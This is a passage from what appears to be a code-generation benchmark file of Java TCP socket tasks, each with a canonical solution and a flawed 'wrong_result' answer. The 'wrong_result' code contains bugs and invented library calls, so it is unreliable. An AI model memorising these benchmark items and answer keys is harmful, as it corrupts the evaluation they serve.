         sock.connect(new InetSocketAddress(address, port), 5000);\n                return;\n            } catch (IOException e) {\n                if (sock.isConnected()) {\n                    sock.close();\n                }\n            }\n        }\n        throw new SocketTimeoutException(\"Failed to connect to all IP addresses for \" + host);\n    }\n}\n```"
  },
  {
    "Task_id": 569,
    "Instruction": "Task Description: Create a Java class that implements an IRC client connection using TCP sockets, with built-in monitoring capabilities through Stetho for network event reporting.\n\nClass Description: The IRCClientConnection class establishes and manages a connection to an IRC server, handles message sending/receiving, and provides monitoring hooks for network events. It implements Closeable for proper resource cleanup.\n\nAttributes:\n- mReporter: [StethoReporter] - Handles network event reporting to Stetho\n- mSocket: [Socket] - The TCP socket connection to the IRC server\n- mInput: [BufferedReader] - Stream for reading incoming messages\n- mOutput: [BufferedWriter] - Stream for sending outgoing messages\n\nMethods:\n- connect: [String host, int port] -> [IRCClientConnection] - Static factory method that establishes a connection to the specified IRC server\n- read: [] -> [String] - Reads a line from the server input stream and handles PING/PONG protocol\n- send: [String message] -> [void] - Sends a message to the server\n- maybeHandleIncomingMessage: [String message] -> [boolean] - Handles protocol-specific messages (like PING)\n- close: [] -> [void] - Closes all connection resources (implements Closeable)\n- StethoReporter (inner class): [] -> [] - Handles all Stetho-specific network event reporting",
    "Canonical_solution": "import com.facebook.stetho.inspector.network.NetworkEventReporter;\nimport com.facebook.stetho.inspector.network.NetworkEventReporterImpl;\nimport com.facebook.stetho.inspector.network.SimpleTextInspectorWebSocketFrame;\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport javax.annotation.Nullable;\n\npublic class IRCClientConnection implements Closeable {\n    private final StethoReporter mReporter;\n    private final Socket mSocket;\n    private final BufferedReader mInput;\n    private final BufferedWriter mOutput;\n\n    public static IRCClientConnection connect(String host, int port) throws IOException {\n        StethoReporter reporter = new StethoReporter();\n        Socket socket = new Socket();\n        reporter.onPreConnect(host, port);\n        try {\n            socket.connect(new InetSocketAddress(host, port));\n            reporter.onPostConnect();\n        } catch (IOException e) {\n            reporter.onError(e);\n            try {\n                socket.close();\n                throw e;\n            } finally {\n                reporter.onClosed();\n            }\n        }\n        return new IRCClientConnection(reporter, socket, \"UTF-8\");\n    }\n\n    private IRCClientConnection(StethoReporter reporter, Socket socket, String charset) throws IOException {\n        mReporter = reporter;\n        mSocket = socket;\n        mInput = new BufferedReader(new InputStreamReader(socket.getInputStream(), charset));\n        mOutput = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), charset));\n    }\n\n    @Nullable\n    public String read() throws IOException {\n        try {\n            String message = mInput.readLine();\n            if (message != null) {\n                mReporter.onReceive(message);\n                maybeHandleIncomingMessage(message);\n            }\n            return message;\n        } catch (IOException e) {\n            mReporter.onError(e);\n            throw e;\n        }\n    }\n\n    public void send(String message) throws IOException {\n        mReporter.onSend(message);\n        try {\n            mOutput.write(message + \"\\r\\n\");\n            mOutput.flush();\n        } catch (IOException e) {\n            mReporter.onError(e);\n            throw e;\n        }\n    }\n\n    private boolean maybeHandleIncomingMessage(String message) throws IOException {\n        if (message.startsWith(\"PING \")) {\n            send(\"PONG \" + message.substring(\"PING \".length()));\n            return true;\n        }\n        return false;\n    }\n\n    public void close() throws IOException {\n        try {\n            try {\n                mOutput.close();\n            } catch (IOException e) {\n                mReporter.onError(e);\n                throw e;\n            }\n        } finally {\n            try {\n                mSocket.close();\n            } catch (IOException e) {\n                mReporter.onError(e);\n                throw e;\n            } finally {\n                mReporter.onClosed();\n            }\n        }\n    }\n\n    private static class StethoReporter {\n        private final NetworkEventReporter mReporter;\n        private final String mRequestId;\n\n        public StethoReporter() {\n            mReporter = NetworkEventReporterImpl.get();\n            mRequestId = mReporter.nextRequestId();\n        }\n\n        public void onPreConnect(String host, int port) {\n            mReporter.webSocketCreated(mRequestId, \"irc://\" + host + \":\" + port);\n        }\n\n        public void onPostConnect() {\n            // Sadly, nothing to report...\n        }\n\n        public void onError(IOException e) {\n            mReporter.webSocketFrameError(mRequestId, e.getMessage());\n        }\n\n        public void onClosed() {\n            mReporter.webSocketClosed(mRequestId);\n        }\n\n        public void onSend(String message) {\n            mReporter.webSocketFrameSent(new SimpleTextInspectorWebSocketFrame(mRequestId, message));\n        }\n\n        public void onReceive(String message) {\n            mReporter.webSocketFrameReceived(new SimpleTextInspectorWebSocketFrame(mRequestId, message));\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport com.facebook.stetho.inspector.protocol.module.Network;\n\npublic class IRCClientConnection implements Closeable {\n    private final StethoReporter mReporter;\n    private final Socket mSocket;\n    private final BufferedReader mInput;\n    private final BufferedWriter mOutput;\n\n    private IRCClientConnection(Socket socket, BufferedReader input, BufferedWriter output) throws IOException {\n        this.mSocket = socket;\n        this.mInput = input;\n        this.mOutput = output;\n        this.mReporter = new StethoReporter();\n        mReporter.reportEvent(\"irc_connect\", \"Connected to IRC server\");\n    }\n\n    public static IRCClientConnection connect(String host, int port) throws IOException {\n        Socket socket = new Socket(host, port);\n        BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        BufferedWriter output = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n        return new IRCClientConnection(socket, input, output);\n    }\n\n    public String read() throws IOException {\n        String line = mInput.readLine();\n        if (line != null && maybeHandleIncomingMessage(line)) {\n            return read(); // Read again after handling PING\n        }\n        mReporter.reportEvent(\"irc_message_in\", \"Received: \" + line);\n        return line;\n    }\n\n    public void send(String message) throws IOException {\n        mOutput.write(message + \"\\r\\n\");\n        mOutput.flush();\n        mReporter.reportEvent(\"irc_message_out\", \"Sent: \" + message);\n    }\n\n    public boolean maybeHandleIncomingMessage(String message) {\n        if (message.startsWith(\"PING \")) {\n            String pongResponse = message.replace(\"PING \", \"PONG \");\n            try {\n                send(pongResponse);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            return true;\n        }\n        return false;\n    }\n\n    @Override\n    public void close() throws IOException {\n        mReporter.reportEvent(\"irc_disconnect\", \"Disconnected from IRC server\");\n        mInput.close();\n        mOutput.close();\n        mSocket.close();\n    }\n\n    private class StethoReporter {\n        public void reportEvent(String eventName, String eventData) {\n            Network.log(eventName, eventData);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 572,
    "Instruction": "Task Description: Create a function that establishes a TCP client connection to a server, sends data from an input stream, and verifies the successful transmission of data.\n\nFunction Description: The function should establish a connection to a server using a Socket, send data from an input stream to the server via an output stream, and ensure the data was transmitted successfully. It should also handle resource cleanup and verify the progress of the transmission.\n\nInput: \n- uri: [URI] - The URI object containing the host and port of the server to connect to.\n- inputStream: [InputStream] - The input stream containing the data to be sent to the server.\n- parser: [Object] - An object that manages the start and stop of the parsing process (assumed to have start() and stop() methods).\n\nOutput: \n- bytes: [long] - The number of bytes successfully transmitted to the server.\n- The function also asserts that the socket is connected, the number of bytes transmitted is greater than 0, and the progress of the transmission matches the expected progress. \n\nNote: The function may throw IOException, InterruptedException, or URISyntaxException.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.net.URISyntaxException;\n\npublic void testNormal() throws IOException, InterruptedException, URISyntaxException {\n    parser.start();\n\n    Socket client = new Socket(uri.getHost(), uri.getPort());\n    assertTrue(\"Socket is connected\", client.isConnected());\n\n    InputStream inputStream = combineResource(Progresses.allFiles);\n    OutputStream outputStream = client.getOutputStream();\n\n    long bytes = ByteStreams.copy(inputStream, outputStream);\n\n    Thread.sleep(100);\n\n    client.close();\n    parser.stop();\n\n    assertThat(bytes, greaterThan(0L));\n    assertThat(progesses, equalTo(Progresses.allProgresses));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic long sendAndVerifyData(URI uri, InputStream inputStream, Object parser) throws IOException, InterruptedException, URISyntaxException {\n    AtomicLong bytesSent = new AtomicLong(0);\n    boolean success = false;\n    Socket socket = null;\n    OutputStream outputStream = null;\n    Thread progressThread = null;\n\n    try {\n        socket = new Socket(uri.getHost(), uri.getPort());\n        outputStream = socket.getOutputStream();\n        parser.getClass().getMethod(\"start\").invoke(parser);\n\n        byte[] buffer = new byte[8192];\n        int bytesRead;\n        while ((bytesRead = inputStream.read(buffer)) != -1) {\n            outputStream.write(buffer, 0, bytesRead);\n            bytesSent.addAndGet(bytesRead);\n        }\n\n        outputStream.flush();\n        success = true;\n    } finally {\n        if (progressThread != null) {\n            parser.getClass().getMethod(\"stop\").invoke(parser);\n            progressThread.join();\n        }\n\n        if (outputStream != null) {\n            outputStream.close();\n        }\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n    assert socket.isConnected() : \"Socket is not connected.\";\n    assert bytesSent.get() > 0 : \"No data was transmitted.\";\n    assert verifyProgress(parser, bytesSent.get()) : \"Transmission progress does not match expected.\";\n\n    return bytesSent.get();\n}\n\nprivate boolean verifyProgress(Object parser, long expectedBytes) throws Exception {\n    Method getProgressMethod = parser.getClass().getMethod(\"getProgress\");\n    long progress = (Long) getProgressMethod.invoke(parser);\n    return progress == expectedBytes;\n}\n```"
  },
  {
    "Task_id": 573,
    "Instruction": "Task Description: Implement a TCP client class in Java that can establish a connection to a server, send and receive data, and properly close the connection.\n\nClass Description: The GaNetCat class provides functionality for TCP client-server communication. It encapsulates socket operations, including connection establishment, data transmission, and resource cleanup.\n\nAttributes:\n- socket: Socket - The underlying socket used for network communication\n- inputStream: InputStream - Stream for receiving data from the server\n- outputStream: OutputStream - Stream for sending data to the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port. Throws IOException if connection fails.\n- sendData(InputStream source) -> void - Reads data from the source InputStream and sends it to the server through the output stream. Throws IOException if transmission fails.\n- receiveData(OutputStream destination) -> void - Receives data from the server and writes it to the destination OutputStream. Stops when encountering EOF or 0x04 (EOT) character. Throws IOException if reception fails.\n- close() -> void - Closes all resources (input stream, output stream, and socket) quietly, suppressing any exceptions during closure.",
    "Canonical_solution": "import org.apache.commons.io.IOUtils;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\n\npublic class GaNetCat {\n\n    private Socket socket;\n    private InputStream inputStream;\n    private OutputStream outputStream;\n\n    public void connect(String host, int port) throws IOException {\n        socket = new Socket();\n        socket.connect(new InetSocketAddress(host, port));\n        inputStream = socket.getInputStream();\n        outputStream = socket.getOutputStream();\n    }\n\n    public void sendData(InputStream source) throws IOException {\n        byte[] dataArray = new byte[1024];\n        int length;\n        do {\n            length = source.read(dataArray);\n            if (length <= 0) {\n                break;\n            }\n            outputStream.write(dataArray, 0, length);\n            outputStream.flush();\n        } while (length > 0);\n    }\n\n    public void receiveData(OutputStream destination) throws IOException {\n        byte[] dataArray = new byte[1024];\n        int length;\n        do {\n            length = inputStream.read(dataArray);\n            if (length == 1 && dataArray[0] == 0x04) {\n                destination.flush();\n                break;\n            }\n            if (length <= 0) {\n                break;\n            }\n            destination.write(dataArray, 0, length);\n        } while (length > 0);\n    }\n\n    public void close() {\n        IOUtils.closeQuietly(inputStream);\n        IOUtils.closeQuietly(outputStream);\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            // ignore\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class GaNetCat {\n    private Socket socket;\n    private InputStream inputStream;\n    private OutputStream outputStream;\n\n    public void connect(String host, int port) throws IOException {\n        socket = new Socket(host, port);\n        inputStream = socket.getInputStream();\n        outputStream = socket.getOutputStream();\n    }\n\n    public void sendData(InputStream source) throws IOException {\n        byte[] buffer = new byte[8192];\n        int bytesRead;\n        while ((bytesRead = source.read(buffer)) != -1) {\n            outputStream.write(buffer, 0, bytesRead);\n        }\n        outputStream.flush();\n    }\n\n    public void receiveData(OutputStream destination) throws IOException {\n        byte[] buffer = new byte[8192];\n        int bytesRead;\n        while ((bytesRead = inputStream.read(buffer)) != -1) {\n            for (int i = 0; i < bytesRead; i++) {\n                if (buffer[i] == 0x04) {\n                    destination.write(buffer, 0, i);\n                    destination.flush();\n                    return;\n                }\n            }\n            destination.write(buffer, 0, bytesRead);\n            destination.flush();\n        }\n    }\n\n    public void close() {\n        try {\n            if (inputStream != null) inputStream.close();\n        } catch (Exception e) {}\n        try {\n            if (outputStream != null) outputStream.close();\n        } catch (Exception e) {}\n        try {\n            if (socket != null) socket.close();\n        } catch (Exception e) {}\n    }\n}\n```"
  },
  {
    "Task_id": 574,
    "Instruction": "Task Description: Create a function that establishes a TCP client connection to a service discovered via Eureka, sends a request, and processes the response.\n\nFunction Description: The function uses Eureka client to discover a service instance, establishes a socket connection to the discovered service, sends a formatted request string, and reads the response. It handles connection errors and IO exceptions appropriately.\n\nInput: \n- eurekaClient: EurekaClient - The Eureka client instance used for service discovery\n- (implicit) vipAddress: String - The virtual IP address of the service to discover (\"sampleservice.mydomain.net\")\n\nOutput: \n- void - The function doesn't return a value but prints the server response or error messages to standard output/error\n- Side effect: Establishes a network connection and communicates with the discovered service\n\nNote: The function includes error handling for service discovery failures, connection issues, and IO operations. The request string is dynamically generated with a timestamp.",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.io.IOException;\n\npublic void sendRequestToServiceUsingEureka(EurekaClient eurekaClient) {\n    String vipAddress = \"sampleservice.mydomain.net\";\n\n    InstanceInfo nextServerInfo = null;\n    try {\n        nextServerInfo = eurekaClient.getNextServerFromEureka(vipAddress, false);\n    } catch (Exception e) {\n        System.err.println(\"Cannot get an instance of example service to talk to from eureka\");\n        System.exit(-1);\n    }\n\n    Socket s = new Socket();\n    int serverPort = nextServerInfo.getPort();\n    try {\n        s.connect(new InetSocketAddress(nextServerInfo.getHostName(), serverPort));\n    } catch (IOException e) {\n        System.err.println(\"Could not connect to the server :\"\n                + nextServerInfo.getHostName() + \" at port \" + serverPort);\n    } catch (Exception e) {\n        System.err.println(\"Could not connect to the server :\"\n                + nextServerInfo.getHostName() + \" at port \" + serverPort + \"due to Exception \" + e);\n    }\n    try {\n        String request = \"FOO \" + new Date();\n\n        PrintStream out = new PrintStream(s.getOutputStream());\n        out.println(request);\n\n        BufferedReader rd = new BufferedReader(new InputStreamReader(s.getInputStream()));\n        String str = rd.readLine();\n        if (str != null) {\n            System.out.println(\"Received response from server: \" + str);\n        }\n        rd.close();\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport com.netflix.appinfo.InstanceInfo;\nimport com.netflix.discovery.EurekaClient;\nimport java.io.*;\nimport java.net.*;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\n\npublic void communicateWithService(EurekaClient eurekaClient) {\n    InstanceInfo instance = eurekaClient.getNextServerFromEureka(\"sampleservice.mydomain.net\", false);\n    if (instance == null) {\n        System.err.println(\"Service discovery failed.\");\n        return;\n    }\n\n    String host = instance.getHostName();\n    int port = instance.getPort();\n\n    try (Socket socket = new Socket(host, port);\n         PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n         BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n\n        SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n        String request = \"Request at \" + sdf.format(new Date());\n        out.println(request);\n\n        String responseLine;\n        while ((responseLine = in.readLine()) != null) {\n            System.out.println(responseLine);\n        }\n    } catch (ConnectException ce) {\n        System.err.println(\"Connection refused: \" + ce.getMessage());\n    } catch (UnknownHostException uhe) {\n        System.err.println(\"Unknown host: \" + uhe.getMessage());\n    } catch (IOException ioe) {\n        System.err.println(\"IO error: \" + ioe.getMessage());\n    } catch (Exception e) {\n        System.err.println(\"Unexpected error: \" + e.getMessage());\n    }\n}\n```"
  },
  {
    "Task_id": 576,
    "Instruction": "Task Description: Create a Java class that handles socket communication for receiving and processing video stream data from an Android device using scrcpy (Screen Copy) technology.\n\nClass Description: ScrcpyInputSocketThread is a thread class that establishes a socket connection to receive video stream data from an Android device, processes the NAL units (Network Abstraction Layer units) from the stream, and manages the communication lifecycle.\n\nAttributes:\n- log: Logger - Logger instance for recording operational information\n- iDevice: IDevice - Represents the connected Android device\n- dataQueue: BlockingQueue<byte[]> - Queue for storing processed video data packets\n- scrcpyLocalThread: ScrcpyLocalThread - Reference to the main scrcpy control thread\n- androidTestTaskBootThread: AndroidTestTaskBootThread - Reference to the Android test task thread\n- session: Session - WebSocket session for sending device information\n- BUFFER_SIZE: int (static final) - Maximum buffer size for video data (10MB)\n- READ_BUFFER_SIZE: int (static final) - Chunk size for reading from the input stream (5KB)\n\nMethods:\n- Constructor(IDevice, BlockingQueue<byte[]>, ScrcpyLocalThread, Session) -> void - Initializes the thread with device, data queue, control thread, and session references\n- run() -> void - Main thread execution that:\n  1. Sets up port forwarding for scrcpy\n  2. Establishes socket connection to localhost\n  3. Sends device screen dimensions via WebSocket\n  4. Continuously reads and processes video stream data\n  5. Manages resources cleanup on termination\n  6. Handles NAL unit detection and packetization\n\nThe class implements proper resource management by:\n1. Closing sockets and streams in finally blocks\n2. Removing port forwarding when done\n3. Cleaning up session references\n4. Interrupting related threads when needed\n5. Handling IOExceptions during communication",
    "Canonical_solution": "import com.android.ddmlib.IDevice;\nimport jakarta.websocket.Session;\nimport org.cloud.sonic.agent.bridge.android.AndroidDeviceBridgeTool;\nimport org.cloud.sonic.agent.common.maps.ScreenMap;\nimport org.cloud.sonic.agent.tests.android.AndroidTestTaskBootThread;\nimport org.cloud.sonic.agent.tools.BytesTool;\nimport org.cloud.sonic.agent.tools.PortTool;\nimport org.slf4j.Logger;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.concurrent.BlockingQueue;\n\npublic class ScrcpyInputSocketThread extends Thread {\n\n    private final Logger log = LoggerFactory.getLogger(ScrcpyInputSocketThread.class);\n    private IDevice iDevice;\n    private BlockingQueue<byte[]> dataQueue;\n    private ScrcpyLocalThread scrcpyLocalThread;\n    private AndroidTestTaskBootThread androidTestTaskBootThread;\n    private Session session;\n    private static final int BUFFER_SIZE = 1024 * 1024 * 10;\n    private static final int READ_BUFFER_SIZE = 1024 * 5;\n\n    public ScrcpyInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, ScrcpyLocalThread scrcpyLocalThread, Session session) {\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.scrcpyLocalThread = scrcpyLocalThread;\n        this.session = session;\n        this.androidTestTaskBootThread = scrcpyLocalThread.getAndroidTestTaskBootThread();\n        this.setDaemon(false);\n        this.setName(androidTestTaskBootThread.formatThreadName(\"android-scrcpy-input-socket-task-%s-%s-%s\"));\n    }\n\n    @Override\n    public void run() {\n        int scrcpyPort = PortTool.getPort();\n        AndroidDeviceBridgeTool.forward(iDevice, scrcpyPort, \"scrcpy\");\n        Socket videoSocket = new Socket();\n        InputStream inputStream = null;\n        try {\n            videoSocket.connect(new InetSocketAddress(\"localhost\", scrcpyPort));\n            inputStream = videoSocket.getInputStream();\n            if (videoSocket.isConnected()) {\n                String sizeTotal = AndroidDeviceBridgeTool.getScreenSize(iDevice);\n                BytesTool.sendText(session, String.format(\"{\\\"msg\\\":\\\"size\\\",\\\"width\\\":\\\"%s\\\",\\\"height\\\":\\\"%s\\\"}\", \n                    sizeTotal.split(\"x\")[0], sizeTotal.split(\"x\")[1]));\n            }\n            int readLength;\n            int naLuIndex;\n            int bufferLength = 0;\n            byte[] buffer = new byte[BUFFER_SIZE];\n            while (scrcpyLocalThread.isAlive()) {\n                readLength = inputStream.read(buffer, bufferLength, READ_BUFFER_SIZE);\n                if (readLength > 0) {\n                    bufferLength += readLength;\n                    for (int i = 5; i < bufferLength - 4; i++) {\n                        if (buffer[i] == 0x00 &&\n                                buffer[i + 1] == 0x00 &&\n                                buffer[i + 2] == 0x00 &&\n                                buffer[i + 3] == 0x01\n                        ) {\n                            naLuIndex = i;\n                            byte[] naluBuffer = new byte[naLuIndex];\n                            System.arraycopy(buffer, 0, naluBuffer, 0, naLuIndex);\n                            dataQueue.add(naluBuffer);\n                            bufferLength -= naLuIndex;\n                            System.arraycopy(buffer, naLuIndex, buffer, 0, bufferLength);\n                            i = 5;\n                        }\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (scrcpyLocalThread.isAlive()) {\n                scrcpyLocalThread.interrupt();\n                log.info(\"scrcpy thread closed.\");\n            }\n            if (videoSocket.isConnected()) {\n                try {\n                    videoSocket.close();\n                    log.info(\"scrcpy video socket closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (inputStream != null) {\n                try {\n                    inputStream.close();\n                    log.info(\"scrcpy input stream closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        AndroidDeviceBridgeTool.removeForward(iDevice, scrcpyPort, \"scrcpy\");\n        if (session != null) {\n            ScreenMap.getMap().remove(session);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport android.os.IInterface;\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.BlockingQueue;\nimport org.eclipse.jetty.websocket.api.Session;\n\npublic class ScrcpyInputSocketThread extends Thread {\n    private static final int BUFFER_SIZE = 10 * 1024 * 1024;\n    private static final int READ_BUFFER_SIZE = 5 * 1024;\n    private final Logger log;\n    private final IDevice iDevice;\n    private final BlockingQueue<byte[]> dataQueue;\n    private final ScrcpyLocalThread scrcpyLocalThread;\n    private final AndroidTestTaskBootThread androidTestTaskBootThread;\n    private final Session session;\n\n    public ScrcpyInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, ScrcpyLocalThread scrcpyLocalThread, Session session) {\n        this.log = Logger.getLogger(ScrcpyInputSocketThread.class.getName());\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.scrcpyLocalThread = scrcpyLocalThread;\n        this.androidTestTaskBootThread = new AndroidTestTaskBootThread();\n        this.session = session;\n    }\n\n    @Override\n    public void run() {\n        Socket socket = null;\n        InputStream inputStream = null;\n        try {\n            iDevice.forward(6030, \"localabstract:scrcpy\");\n            socket = new Socket(\"localhost\", 6030);\n            inputStream = socket.getInputStream();\n\n            String displayInfo = getDisplayInfo();\n            if (session.isOpen()) {\n                session.getRemote().sendString(displayInfo);\n            }\n\n            byte[] buffer = new byte[BUFFER_SIZE];\n            int bytesRead;\n            ByteArrayOutputStream nalBuffer = new ByteArrayOutputStream(BUFFER_SIZE);\n\n            while (!isInterrupted()) {\n                byte[] readBuffer = new byte[READ_BUFFER_SIZE];\n                bytesRead = inputStream.read(readBuffer);\n                if (bytesRead == -1) break;\n\n                for (int i = 0; i < bytesRead; i++) {\n                    byte b = readBuffer[i];\n                    nalBuffer.write(b);\n                    if (b == 0x00 && nalBuffer.size() > 3 && nalBuffer.toByteArray()[nalBuffer.size() - 2] == 0x00 && nalBuffer.toByteArray()[nalBuffer.size() - 3] == 0x00 && nalBuffer.toByteArray()[nalBuffer.size() - 4] == 0x01) {\n                        byte[] nalUnit = nalBuffer.toByteArray();\n                        nalBuffer.reset();\n                        dataQueue.put(nalUnit);\n                    }\n                }\n            }\n        } catch (IOException | InterruptedException e) {\n            log.severe(\"Error during socket communication: \" + e.getMessage());\n        } finally {\n            try {\n                if (inputStream != null) inputStream.close();\n                if (socket != null) socket.close();\n                iDevice.forwardRemove(6030);\n                if (session.isOpen()) session.close();\n                scrcpyLocalThread.interrupt();\n                androidTestTaskBootThread.interrupt();\n            } catch (IOException e) {\n                log.warning(\"Failed to clean up resources: \" + e.getMessage());\n            }\n        }\n    }\n\n    private String getDisplayInfo() throws IOException {\n        // Simulated method to fetch display info\n        return \"{\\\"width\\\":1920,\\\"height\\\":1080}\";\n    }\n}\n```"
  },
  {
    "Task_id": 578,
    "Instruction": "Task Description: Implement a Java class for sending HTTP requests and receiving responses using socket communication.\n\nClass Description: The HTTPRequest class extends HTTPPacket and provides functionality to send HTTP POST requests to a specified server. It handles connection management, request formatting, and response processing, with support for keep-alive connections and chunked transfer encoding.\n\nAttributes:\npostSocket: Socket - The socket used for communication with the server\n\nMethods:\npost: [Name](host: String, port: int, isKeepAlive: boolean) -> HTTPResponse - Sends an HTTP POST request to the specified host and port, with optional keep-alive connection\npost: [Name](host: String, port: int) -> HTTPResponse - Sends an HTTP POST request to the specified host and port with connection closing by default (calls the 3-parameter version with isKeepAlive=false)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.InetSocketAddress;\n\npublic class HTTPRequest extends HTTPPacket {\n\n    private Socket postSocket = null;\n\n    public HTTPResponse post(String host, int port, boolean isKeepAlive) {\n        HTTPResponse httpRes = new HTTPResponse();\n        setHost(host);\n        setConnection((isKeepAlive == true) ? HTTP.KEEP_ALIVE : HTTP.CLOSE);\n        boolean isHeaderRequest = isHeadRequest();\n        \n        OutputStream out = null;\n        InputStream in = null;\n        \n        try {\n            if (postSocket == null){\n                postSocket = new Socket();\n                postSocket.connect(new InetSocketAddress(host, port), HTTPServer.DEFAULT_TIMEOUT);\n            }\n\n            out = postSocket.getOutputStream();\n            PrintStream pout = new PrintStream(out);\n\n            String httpPacket = \"\";\n            httpPacket += getHeader();\n            httpPacket += HTTP.CRLF;\n            \n            boolean isChunkedRequest = isChunked();\n            String content = getContentString();\n            int contentLength = 0;\n            if (content != null)\n                contentLength = content.length();\n            \n            if (0 < contentLength) {\n                if (isChunkedRequest == true) {\n                    String chunSizeBuf = Long.toHexString(contentLength);\n                    httpPacket += chunSizeBuf;\n                    httpPacket += HTTP.CRLF;\n                }\n                httpPacket += content;\n                if (isChunkedRequest == true) {\n                    httpPacket += HTTP.CRLF;\n                }\n            }\n\n            if (isChunkedRequest == true) {\n                httpPacket += \"0\";\n                httpPacket += HTTP.CRLF;\n            }\n\n            pout.print(httpPacket);\n            pout.flush();\n\n            in = postSocket.getInputStream();\n            httpRes.set(in, isHeaderRequest);        \n        } catch (SocketException e) {\n            httpRes.setStatusCode(HTTPStatus.INTERNAL_SERVER_ERROR);\n        } catch (IOException e) {\n            httpRes.setStatusCode(HTTPStatus.INTERNAL_SERVER_ERROR);\n        } finally {\n            if (isKeepAlive == false) {    \n                try {\n                    if (in != null) in.close();\n                } catch (Exception e) {};\n                try {\n                    if (out != null) out.close();\n                } catch (Exception e) {};\n                try {\n                    if (postSocket != null) postSocket.close();\n                } catch (Exception e) {};\n                postSocket = null;\n            }\n        }\n        \n        return httpRes;\n    }\n\n    public HTTPResponse post(String host, int port) {\n        return post(host, port, false);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class HTTPRequest extends HTTPPacket {\n    protected Socket postSocket;\n\n    public HTTPResponse post(String host, int port, boolean isKeepAlive) throws IOException {\n        postSocket = new Socket(host, port);\n        OutputStream out = postSocket.getOutputStream();\n        InputStream in = postSocket.getInputStream();\n\n        String requestLine = \"POST / HTTP/1.1\\r\\n\";\n        String hostHeader = \"Host: \" + host + \"\\r\\n\";\n        String connectionHeader = \"Connection: \" + (isKeepAlive ? \"keep-alive\" : \"close\") + \"\\r\\n\";\n        String contentLengthHeader = \"Content-Length: 0\\r\\n\";\n        String contentTypeHeader = \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\n        String transferEncodingHeader = \"Transfer-Encoding: chunked\\r\\n\";\n        String endOfHeaders = \"\\r\\n\";\n\n        String headers = requestLine + hostHeader + connectionHeader + contentLengthHeader + contentTypeHeader + transferEncodingHeader + endOfHeaders;\n        byte[] headerBytes = headers.getBytes();\n        out.write(headerBytes);\n\n        // Send a zero chunk to indicate end of data for chunked encoding\n        out.write(\"0\\r\\n\\r\\n\".getBytes());\n\n        HTTPResponse response = new HTTPResponse();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n        StringBuilder responseBuilder = new StringBuilder();\n        String line;\n\n        while ((line = reader.readLine()) != null) {\n            responseBuilder.append(line).append(\"\\n\");\n        }\n\n        response.setRawResponse(responseBuilder.toString());\n        return response;\n    }\n\n    public HTTPResponse post(String host, int port) throws IOException {\n        return post(host, port, false);\n    }\n}\n```"
  },
  {
    "Task_id": 579,
    "Instruction": "Task Description: Create a TCP client class in Java that can connect to a server, send messages, receive responses, and properly close the connection.\n\nClass Description: The TCPClient class provides functionality for establishing and managing a TCP connection with a server. It handles connection establishment, message sending/receiving, and resource cleanup.\n\nAttributes:\n- mClientSocket: [Socket] - The socket object representing the connection to the server\n- mPrintWriter: [PrintWriter] - Output stream for sending data to the server\n- mBufferedReader: [BufferedReader] - Input stream for receiving data from the server\n\nMethods:\n- connectTCPServer(): [void] - Establishes a persistent connection to the TCP server at \"localhost:8688\" and continuously listens for incoming messages\n- sendMessage(String msg): [void] - Sends a message to the connected server (Input: msg - the message string to send)\n- closeConnection(): [void] - Properly closes all network resources and connections",
